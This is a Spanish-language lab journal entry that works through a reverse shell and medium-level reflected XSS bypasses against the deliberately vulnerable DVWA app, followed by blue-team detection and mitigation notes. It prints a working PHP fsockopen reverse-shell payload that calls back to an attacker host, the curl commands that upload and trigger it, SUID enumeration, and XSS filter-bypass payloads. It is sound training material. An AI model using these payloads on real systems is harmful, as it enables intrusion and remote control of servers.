# Día 14 — Reverse Shells + XSS Medium

**Fecha:** Abril 2026  
**MITRE:** T1059, T1185  
**DVWA:** XSS Reflected (Medium)

---

## Teoría

### Reverse Shell
Una reverse shell es una conexión donde el servidor víctima se conecta hacia el atacante en lugar de al revés. Es útil para evadir firewalls que bloquean conexiones entrantes pero permiten conexiones salientes. El atacante abre un puerto en escucha y espera que la víctima se conecte.

```
Shell normal:   Kali → Ubuntu  (conexión entrante al servidor)
Reverse shell:  Ubuntu → Kali  (conexión saliente del servidor)
```

### XSS Medium
En nivel Low el filtro no existe — cualquier etiqueta `<script>` se ejecuta. En nivel Medium DVWA aplica un `str_replace('<script>', '')` case-sensitive que elimina la etiqueta en minúsculas pero no sus variantes. El bypass más simple es cambiar una letra a mayúscula o usar eventos HTML alternativos que también ejecutan JavaScript.

---

## Red Team

### Sección 1 — Preparar listener en Kali

```bash
nc -lvnp 4444
```

Kali queda escuchando en puerto 4444 esperando conexión entrante.

### Sección 2 — Subir reverse shell PHP

La webshell del Día 11 usa `$_GET["cmd"]` — no maneja bien redirecciones de bash. Se subió una webshell dedicada para reverse shell usando `fsockopen`:

```bash
echo '<?php $sock=fsockopen("192.168.1.132",4444);$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>' > /tmp/rshell.php

curl -s -X POST "http://192.168.1.96:8080/vulnerabilities/upload/" \
  -b "PHPSESSID=<session>; security=low" \
  -F "uploaded=@/tmp/rshell.php;type=image/jpeg" \
  -F "Upload=Upload" | grep -i "succesfully"
```

```
../../hackable/uploads/rshell.php succesfully uploaded!
```

### Sección 3 — Ejecutar reverse shell

```bash
curl -s "http://192.168.1.96:8080/hackable/uploads/rshell.php" \
  -b "PHPSESSID=<session>; security=low"
```

**Conexión recibida en Kali:**
```
connect to [192.168.1.132] from (UNKNOWN) [192.168.1.96] 46188
bash: cannot set terminal process group (334): Inappropriate ioctl for device
www-data@2a4e45deeae1:/var/www/html/hackable/uploads$
```

Shell interactiva establecida como `www-data` dentro del contenedor Docker de DVWA.

### Sección 4 — Enumeración post-explotación

```bash
whoami   → www-data
id       → uid=33(www-data) gid=33(www-data)
uname -a → Linux 2a4e45deeae1 6.17.0-19-generic
```

### Sección 5 — Escalada de privilegios: binarios SUID

Los binarios SUID son archivos que se ejecutan con los privilegios de su dueño en lugar del usuario que los ejecuta. Si un binario SUID tiene dueño root y puede ejecutar comandos arbitrarios, es un vector de escalada de privilegios.

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Binarios encontrados:**
```
/bin/su
/bin/mount
/bin/ping6
/bin/ping
/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
```

Ninguno explotable — todos son binarios de sistema estándar sin capacidad de ejecutar comandos arbitrarios. `sudo` no está instalado en el contenedor.

**Conclusión:** Contenedor Docker bien configurado — sin vectores de escalada disponibles. La escalada de privilegios con técnicas específicas (SUID, sudo, cron) se cubre en Días 16-18.

### Sección 6 — DVWA XSS Reflected (Medium)

El filtro de Medium elimina `<script>` con `str_replace` case-sensitive.

**Confirmación del filtro:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/xss_r/?name=<script>alert(1)</script>&Submit=Submit" \
  -b "PHPSESSID=<session>; security=medium" | grep -i "alert\|hello"
```
```
Hello alert(1)</script>
```
La etiqueta `<script>` fue eliminada — el filtro funciona solo en minúsculas.

**Bypass — Case Mutation:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/xss_r/?name=<Script>alert(1)</Script>&Submit=Submit" \
  -b "PHPSESSID=<session>; security=medium" | grep -i "hello"
```
```
Hello <Script>alert(1)</Script>
```

**Bypass — Evento HTML `onerror`:**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/xss_r/?name=<img+src=x+onerror=alert(1)>&Submit=Submit" \
  -b "PHPSESSID=<session>; security=medium" | grep -i "hello"
```
```
Hello <img src=x onerror=alert(1)>
```

**Resumen de técnicas:**

| Técnica | Payload | Resultado |
|---------|---------|-----------|
| `<script>` directo | `<script>alert(1)</script>` | ❌ Bloqueado |
| Case mutation | `<Script>alert(1)</Script>` | ✅ Bypass |
| Evento HTML | `<img src=x onerror=alert(1)>` | ✅ Bypass |

---

## Blue Team

### Detección Reverse Shell
- Conexión saliente inesperada desde el servidor web hacia IP externa en puerto no estándar (4444)
- Proceso `bash` hijo de `apache2` o `php` — patrón anómalo
- Un IDS con reglas de detección de reverse shells alertaría por la combinación proceso + conexión saliente

### Detección XSS
- Parámetros GET con etiquetas HTML o eventos JavaScript — `<script>`, `onerror=`, `alert(`
- Un WAF con reglas XSS detectaría estos patrones independientemente de mayúsculas/minúsculas

### Mitigación XSS Medium
- Usar `htmlspecialchars()` en lugar de `str_replace` — convierte `<` y `>` en entidades HTML
- El filtro correcto es agnóstico a mayúsculas y cubre todas las etiquetas y eventos HTML
- Nunca confiar en listas negras de etiquetas — siempre escapar el output

---

## Conclusión

La reverse shell demostró que con acceso a la webshell del Día 11 es posible establecer una conexión interactiva completa desde el servidor hacia Kali, evadiendo restricciones de firewall. El contenedor Docker bien configurado limitó la escalada de privilegios — sin binarios SUID explotables ni sudo disponible. XSS Medium mostró que filtros basados en listas negras case-sensitive son trivialmente bypasseables — la defensa correcta es escapar el output con `htmlspecialchars()`, no bloquear etiquetas específicas.
